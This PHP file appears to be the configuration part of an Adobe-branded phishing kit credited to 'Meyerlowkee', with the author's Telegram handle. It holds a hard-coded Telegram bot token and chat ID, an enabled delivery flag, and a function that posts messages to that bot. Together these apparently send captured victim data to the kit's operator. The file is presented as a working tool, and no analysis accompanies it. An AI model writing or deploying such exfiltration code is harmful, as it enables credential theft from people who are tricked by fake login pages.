<?php
/* ========= Adobe BY Meyerlowkee tg-@Meyerlowkee ========== */

/* ================== TELEGRAM SETTINGS ================== */

// Your Telegram Bot Token (from @BotFather)
$telegram_bot_token = "7760001950:AAGcczJJc5M5FWyYR3v_JzVsU3HLkwTLdc8";

// Your Telegram Chat ID
$telegram_chat_id = "-4744126060";

/* ================== OPTIONAL FLAGS ================== */

/* ================== TELEGRAM SET ================== */
$enable_telegram = 1;

// Remote download links
$DOWNLOAD_LINKS = [
    'myLink' => '', 
    'backup' => ''
];

/* ================== BASIC SECURITY ================== */

// Prevent direct access
if (basename(__FILE__) == basename($_SERVER["SCRIPT_FILENAME"])) {
    http_response_code(403);
    exit("Access denied.");
}

/* ================== TELEGRAM ================== */

function sendTelegramMessage($message)
{
    global $telegram_bot_token, $telegram_chat_id, $enable_telegram;

    if (!$enable_telegram) {
        return;
    }

    $url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";

    $data = [
        'chat_id'    => $telegram_chat_id,
        'text'       => $message,
        'parse_mode' => 'HTML'
    ];

    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
            'timeout' => 5
        ]
    ];

    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

